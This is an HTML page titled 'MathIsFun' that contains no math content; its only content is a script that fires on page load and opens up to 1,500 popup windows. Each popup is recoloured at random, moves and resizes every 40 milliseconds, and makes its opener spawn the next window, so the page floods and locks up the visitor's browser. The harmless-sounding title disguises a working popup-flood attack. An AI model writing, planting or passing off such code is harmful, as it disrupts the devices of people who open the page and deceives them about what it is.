<!DOCTYPE html>
<html>
<head>
    <title>MathIsFun</title>
</head>

<body>

<script>
const TOTAL_WINDOWS = 1500;
let opened = 0;

function openPopup() {

    if (opened >= TOTAL_WINDOWS) return;

    const width = 300;
    const height = 200;

    const left =
        Math.random() * Math.max(1, screen.availWidth - width);

    const top =
        Math.random() * Math.max(1, screen.availHeight - height);

    const popup = window.open(
        "",
        "_blank",
        `width=${width},height=${height},left=${left},top=${top}`
    );

    if (!popup) return;

    opened++;

    const number = opened;

    popup.document.write(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>MathIsFun ${number}</title>
        </head>

        <body style="
            margin:0;
            overflow:hidden;
            background:#${Math.floor(
                Math.random() * 16777215
            ).toString(16).padStart(6, "0")};
            color:white;
            font-family:Arial;
            text-align:center;
        ">

            <h1>MathIsFun ${number}</h1>

            <script>

                // Rapid movement and resizing
                setInterval(() => {
                    try {

                        const newWidth =
                            Math.floor(Math.random() * 500) + 100;

                        const newHeight =
                            Math.floor(Math.random() * 400) + 80;

                        const x =
                            Math.random() *
                            Math.max(1, screen.availWidth - newWidth);

                        const y =
                            Math.random() *
                            Math.max(1, screen.availHeight - newHeight);

                        window.moveTo(x, y);
                        window.resizeTo(newWidth, newHeight);

                    } catch (e) {}
                }, 40);

                // Replicate
                setTimeout(() => {

                    try {
                        window.opener.openPopup();
                    } catch (e) {}

                }, 100);

            <\/script>

        </body>
        </html>
    `);

    popup.document.close();
}

// Start the first popup
window.addEventListener("load", () => {
    openPopup();
});

</script>

</body>
</html>
